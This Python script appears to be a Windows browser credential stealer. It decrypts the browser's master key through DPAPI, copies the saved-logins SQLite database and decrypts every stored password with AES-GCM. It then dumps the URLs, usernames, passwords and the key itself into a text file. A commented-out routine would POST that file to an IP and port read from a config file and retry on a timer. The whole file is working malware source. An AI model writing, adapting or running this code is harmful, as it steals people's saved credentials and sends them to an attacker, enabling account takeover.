import sqlite3
import shutil
import base64
import json
import os
import requests
import threading
from Crypto.Cipher import AES
import win32crypt
import sys


def delete_file(file):
    try:
        os.remove(file)
        #os.remove("passwords.txt")
    except:
        pass


#try:
#    with open("todo.txt", "r") as f:
#        lines = f.readlines()
#        ip_address = lines[0].strip()
#        interval = int(lines[1])
#        port = lines[2]
#        f.close()
#except:
#    pass
#def send():
#    try:
#        with open("passwords.txt", "r") as f:
#            payload = json.dumps({"content": f.read()})
#            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
#        delete_file()
#        return
#    except:
#        try:
#            timer = threading.Timer(interval, send)
#            timer.start()
#        except:
#            return
        
        
def load_path(id):
    try:
        with open("todo.txt", "r") as f:
            lines = f.readlines()
            dir_path = lines[3].strip()
            db_path = lines[4]
            f.close()
    except:
        return
        
    if id == "dir":
        return dir_path
    elif id == "db":
        return db_path


def store_data(data):
    with open("passwords.txt", 'a') as f:
        f.write("\n##########################################")
        f.write(data)
        f.write("##########################################")


def fetch_key(key_dir):
    try:
        try:
            dir_path = os.path.join(os.environ["USERPROFILE"], key_dir)
        except:
            return
            
        with open(dir_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return


def decrypt_password(password, key):
    try:
        i = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, i)
        
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "Password could not be decrypted or none were found!"

def save_passwords(db_dir, key_dir):
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
    except:
        sys.exit(0)
    file = "data.db"
    try:
        shutil.copyfile(db_path, file)
    except:
        sys.exit(0)
        
    db = sqlite3.connect(file)
    cursor = db.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_url = row[1]
        username = row[2]
        date_created = row[4]
        last_usage = row[5]

        if username or decrypt_password(row[3], fetch_key(key_dir)):
            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
            store_data(data)
        else:
            continue

    with open("passwords.txt", "a") as f:
        f.write(f"\n################==Encryption-Key==################\n{fetch_key(key_dir)}")

    cursor.close()
    db.close()
    delete_file(file)
    #send()

save_passwords(load_path("db"), load_path("dir"))
